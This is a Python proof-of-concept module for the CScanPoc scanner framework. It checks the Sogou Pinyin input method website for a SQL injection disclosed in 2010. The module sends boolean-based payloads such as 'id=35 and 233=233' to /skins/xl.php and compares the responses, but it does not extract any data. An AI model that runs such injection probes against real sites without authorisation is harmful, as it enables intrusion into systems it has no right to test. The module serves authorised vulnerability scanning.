# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Sougou_0009' # 平台漏洞编号
    name = '搜狗拼音输入法官网存在SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2010-08-03'  # 漏洞公布时间
    desc = '''
        搜狗拼音输入法官网存在SQL注入漏洞，攻击者可以通过构造恶意SQL语句泄露出数据库中的重要信息。
    ''' # 漏洞描述
    ref = 'Uknown' #https://wooyun.shuimugan.com/bug/view?bug_no=157
    cnvd_id = 'Uknown' # cnvd漏洞编号
    cve_id = 'Uknown'  # cve编号
    product = '搜狗'  # 漏洞组件名称
    product_version = 'Uknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '34b28a81-61b6-4d8a-88b1-7a3972f2ff02' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            
            payload1 = '/skins/xl.php?id=35 and 233=233'
            payload2 = '/skins/xl.php?id=35 and 233=234'
            vul_url1 = arg + payload1
            vul_url2 = arg + payload2
            response1 = requests.get(vul_url1)
            response2 = requests.get(vul_url2)

            if response1.text != response2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
